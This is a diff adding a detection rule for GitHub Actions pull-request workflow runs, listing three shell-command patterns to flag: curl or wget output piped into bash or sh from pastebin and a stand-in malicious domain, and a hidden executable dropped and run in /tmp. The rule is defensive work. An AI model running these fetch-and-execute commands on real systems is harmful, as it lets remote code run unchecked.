@@ -1,0 +1,12 @@
+title: Detect Malicious Shell Command in GitHub Actions Workflow
+logsource:
+  product: github_actions
+  service: workflow_run
+detection:
+  event_type: pull_request
+  actor_type: user
+  shell_command:
+    - 'curl -s https://*.pastebin.com/raw/* | bash'
+    - 'wget -qO- https://*.malicious-domain.com/* | sh'
+    - 'echo "malicious payload" > /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden &'
+  condition: shell_command
